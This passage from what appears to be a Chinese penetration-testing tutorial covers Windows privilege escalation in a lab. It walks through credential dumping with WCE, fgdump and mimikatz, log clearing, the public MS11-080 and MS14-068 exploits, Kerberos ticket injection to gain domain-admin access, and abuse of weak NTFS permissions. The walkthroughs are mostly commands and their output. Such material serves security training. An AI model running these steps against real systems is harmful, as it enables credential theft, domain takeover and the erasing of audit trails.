class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure><ul><li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p><ul><li>防范方法：修改注册表</li></ul><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\L</span>sa<span class="symbol">\S</span>ecurity Packages</span><br></pre></td></tr></table></figure><ul><li>删除 wdigest 之后重启计算机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul><li>PwDump localhost<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li></ul></li><li>fgdump<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul><li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Win32&gt;mimikatz.exe</span><br><span class="line">查看帮助是：：</span><br><span class="line">mimikatz # ::</span><br><span class="line">        standard  -  Standard module  [Basic commands (does <span class="keyword">not</span> require module name)]</span><br><span class="line">          crypto  -  Crypto Module</span><br><span class="line">        sekurlsa  -  SekurLSA module  [Some commands <span class="keyword">to</span> enumerate credentials<span class="built_in">..</span>.]</span><br><span class="line">        kerberos  -  Kerberos package module  []</span><br><span class="line">       privilege  -  Privilege module</span><br><span class="line">         process  -  Process module</span><br><span class="line">        <span class="built_in"> service </span> - <span class="built_in"> Service </span>module</span><br><span class="line">         lsadump  -  LsaDump module</span><br><span class="line">              ts  -  Terminal<span class="built_in"> Server </span>module</span><br><span class="line">           event  -  Event module</span><br><span class="line">            misc  -  Miscellaneous module</span><br><span class="line">           token  -  Token manipulation module</span><br><span class="line">           vault  -  Windows Vault/Credential module</span><br><span class="line">     minesweeper  -  MineSweeper module</span><br><span class="line">             net  -</span><br><span class="line">           dpapi  -  DPAPI Module (by API <span class="keyword">or</span><span class="built_in"> RAW </span>access)  [Data Protection application programming interface]</span><br><span class="line">       busylight  -  BusyLight Module</span><br><span class="line">          sysenv  - <span class="built_in"> System </span>Environment Value module</span><br><span class="line">             sid  -  Security Identifiers module</span><br><span class="line">             iis  -  IIS XML<span class="built_in"> Config </span>module</span><br><span class="line">             rpc  -  RPC control of mimikatz</span><br><span class="line">mimikatz # privilege::</span><br><span class="line">Module :        privilege</span><br><span class="line">Full name :     Privilege module</span><br><span class="line"></span><br><span class="line">           <span class="builtin-name">debug</span>  -  Ask <span class="builtin-name">debug</span> privilege            * *</span><br><span class="line">          driver  -  Ask load driver privilege</span><br><span class="line">        security  -  Ask security privilege</span><br><span class="line">             tcb  -  Ask tcb privilege</span><br><span class="line">          backup  -  Ask backup privilege</span><br><span class="line">         restore  -  Ask restore privilege</span><br><span class="line">          sysenv  -  Ask<span class="built_in"> system </span>environment privilege</span><br><span class="line">              id  -  Ask a privilege by its id</span><br><span class="line">            name  -  Ask a privilege by its name</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line">mimikatz # process::list</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # lsadump::cache</span><br><span class="line">mimikatz # ts::multirdp</span><br><span class="line">mimikatz # event::clear</span><br><span class="line">mimikatz # event::drop</span><br><span class="line">mimikatz # misc::regedit</span><br><span class="line">mimikatz # token::whoami</span><br></pre></td></tr></table></figure><h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul><li><p>Ms011-080 对应补丁 Kb2592799</p><p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p><p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># searchsploit Ms11-080</span></span><br><span class="line">------------------------------------------ --------------------------------</span><br><span class="line"> Exploit Title                            |  Path</span><br><span class="line">                                          | (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">------------------------------------------ --------------------------------</span><br><span class="line">Microsoft Windows - <span class="string">'AfdJoinLeaf'</span> Local P | exploits/windows/local/<span class="number">21844</span>.rb</span><br><span class="line">Microsoft Windows XP/<span class="number">2003</span> - <span class="string">'afd.sys'</span> Loc | exploits/windows/local/<span class="number">18176</span>.py</span><br><span class="line">------------------------------------------ --------------------------------</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/exploitdb/exploits/windows/local/18176.py .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)</span></span><br><span class="line"><span class="comment"># 首先查看 WinXP 是否安装了 对应更新 Kb2592799</span></span><br><span class="line">WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 查看 WinXP下的文件路径</p><p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="number">18176.</span>py -O XP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  启动任务管理器</p><p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  结束 kevin 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165317715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  输入 explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316532377.png" alt="在这里插入图片描述"></p><p>  启动 system 权限的 explorer 桌面程序</p><p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.WinXP 无需安装 Pyhon 的运行环境</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python2 的 pyinstaller 将 python 文件进行打包</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install python-pip</span></span><br><span class="line">root@kali:~<span class="comment"># pip install pyinstaller</span></span><br><span class="line"><span class="comment"># 或者 WinXP 下，安装 python2.7</span></span><br><span class="line">C:<span class="string">\&gt;pyinstaller</span> --onefile <span class="number">18176.py</span></span><br><span class="line"><span class="number">297</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc</span><br><span class="line"><span class="number">297</span> INFO: Appending archive <span class="keyword">to</span> EXE C:<span class="string">\dist\18176.exe</span></span><br><span class="line"><span class="number">328</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc completed successfully.</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件目录，将文件复制到目标主机</span></span><br><span class="line">C:\&gt;whoami</span><br><span class="line">test</span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>test</span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line"><span class="comment"># 查看文件位置</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;cd <span class="number">111</span></span><br><span class="line">C:\<span class="number">111</span>&gt;<span class="number">18176.</span>exe -O XP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">SYSTEM</span><br><span class="line"><span class="comment"># 将自己添加为管理员组</span></span><br><span class="line">C:\WINDOWS\system32&gt;net localgroup administrators test /add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p><h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul><li><p>使用 win2003 搭建域控制器</p><ul><li><p>配置并连接域控制器</p><ul><li>运行 -&gt; dcpromo</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165412201.png" alt="在这里插入图片描述"></p></li></ul></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Win2003 设置成域控制器，配置静态 IP 地址</span></span><br><span class="line"><span class="comment"># Win2003 设置强密码</span></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>Administrator jlcssadmin2006<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># Win7 设置 静态 IP并将 DNS 设置为 Win2003 的IP地址</span></span><br><span class="line"><span class="comment"># Win7 加入域控制器</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p><p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p><p>重启之后</p><p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>修改 Win2003 中的域控制器的用户权限</p><ul><li>Win2003 -&gt; 运行 -&gt; dsa.msc</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>win2003</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Win7 可以查看域控制器共享出来的文件等资源</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p><ul><li><p>使用漏洞代码攻击域控制器</p><ul><li><p>获取攻击文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root@kali:~# searchsploit Ms14-068</span></span><br><span class="line"><span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line"> Exploit Title                            |  Path</span><br><span class="line">                              | <span class="params">(/usr/share/exploitdb/)</span></span><br><span class="line"><span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line">Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py</span><br><span class="line"><span class="params">------------------------------------------</span> <span class="params">---------------------------------</span></span><br><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</span></span><br></pre></td></tr></table></figure></li><li><p>域环境下使用通用工具查看本地密码</p></li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="string">\fgdump&gt;PwDump.exe</span> localhost<span class="comment"># 仅是本地密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span><span class="comment"># 结果是域控制器密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span> -w</span><br><span class="line">Administrator<span class="string">\LAB:jlcssadmin</span></span><br><span class="line">C:<span class="string">\Win32&gt;mimikatz.exe</span></span><br><span class="line">mimikatz <span class="comment"># ::</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">'20'</span> OK</span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br></pre></td></tr></table></figure><ul><li>漏洞利用过程</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 首先在 kali 通过脚本生成一个票据文件</span><br><span class="line"># ms14<span class="number">-068.</span>py -u <span class="symbol">user@</span>lab.com -s userSID -d dc.lab.com</span><br><span class="line">-u 用户名:登录用户名</span><br><span class="line">-s userSID</span><br><span class="line">-d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替</span><br><span class="line"><span class="number">2.</span> 将票据文件拷贝到 win 系统里</span><br><span class="line"># 拷贝 <span class="symbol">TGT_user1@</span>lab.com.ccache 到windows系统</span><br><span class="line"><span class="number">3.</span> 在 win 系统里使用 mimikatz.exe 完成权限的提升</span><br><span class="line"># mimikatz.exe log <span class="string">"kerberos::ptc TGT_user@lab.com.ccache"</span> exit</span><br><span class="line">  </span><br><span class="line"># 在 Win7 上使用本地用户登录</span><br><span class="line"># 查看域账号的信息</span><br><span class="line">C:\&gt;net user</span><br><span class="line">\\WIN7-VM 的用户帐户</span><br><span class="line">Administrator            Guest                    John</span><br><span class="line">user1                    user2</span><br><span class="line">命令成功完成。</span><br><span class="line">C:\Win32&gt;whoami.exe /all</span><br><span class="line">[User]     = <span class="string">"LAB\user3"</span>  S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span></span><br><span class="line"></span><br><span class="line"># kali 报错缺少模块</span><br><span class="line"><span class="symbol">root@</span>kali:~# python <span class="number">35474.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">  </span><br><span class="line"># 下载安装模块https:<span class="comment">//github.com/bidord/pykek</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p></li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~/Desktop/pykek-master# python ms14<span class="number">-068.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">Password: </span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending AS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending TGS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">'TGT_user1@lab.com.ccache'</span>... Done</span><br><span class="line"># 将文件拷贝到 Win7</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 在 Win7 下执行</span><br><span class="line">C:\mimikatz\Win32&gt;mimikatz.exe log <span class="string">"kerberos::ptc TGT_user3@lab.com.ccache"</span> exit</span><br><span class="line">![在这里插入图片描述](https:<span class="comment">//img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)</span></span><br><span class="line"></span><br><span class="line"># 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket</span><br><span class="line">C:\mimikatz\Win32&gt;klist</span><br><span class="line">当前登录 ID 是 <span class="number">0</span>:<span class="number">0x776bd</span></span><br><span class="line">缓存的票证: (<span class="number">1</span>)</span><br><span class="line">#<span class="number">0</span>&gt;     客户端: user3 @ LAB.COM</span><br><span class="line">        服务器: krbtgt/LAB.COM @ LAB.COM</span><br><span class="line">        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">        票证标志 <span class="number">0x50a00000</span> -&gt; forwardable proxiable renewable pre_authent</span><br><span class="line">        开始时间: <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">45</span> (本地)</span><br><span class="line">        结束时间:   <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">        续订时间: <span class="number">3</span>/<span class="number">11</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul><li>与漏洞提权相比更常用的方法 <ul><li>企业环境 </li><li>补丁更新的全部已经安装 </li><li>输入变量过滤之外更值得研发关注的安全隐患 </li><li>以system权限启动 </li><li>NTFS权限允许users修改删除 </li></ul></li><li>icacls<ul><li>icacls c:\windows*.exe /save perm /T </li><li>i586-mingw32msvc-gcc -o admin.exe admin.c </li></ul></li><li>Find<ul><li>find / -perm 777 -exec ls -l {} ; </li></ul></li><li>应用系统的配置文件 <ul><li>应用连接数据库的配置文件 </li></ul></li></ul><h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212609.png" alt=""></p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212636.png" alt=""></p><ul><li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="string">\&gt;icacls</span> boot.ini</span><br><span class="line">boot.ini BUILTIN<span class="string">\Power</span> Users:(RX)</span><br><span class="line">         BUILTIN<span class="string">\Administrators:(F)</span></span><br><span class="line">         NT AUTHORITY<span class="string">\SYSTEM:(F)</span></span><br><span class="line"></span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br><span class="line"><span class="comment"># 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询各程序的权限情况</span></span><br><span class="line">C:<span class="string">\&gt;icacls</span> c:<span class="string">\windows\*.exe</span> /save saveicacls /T</span><br></pre></td></tr></table></figure><p><img 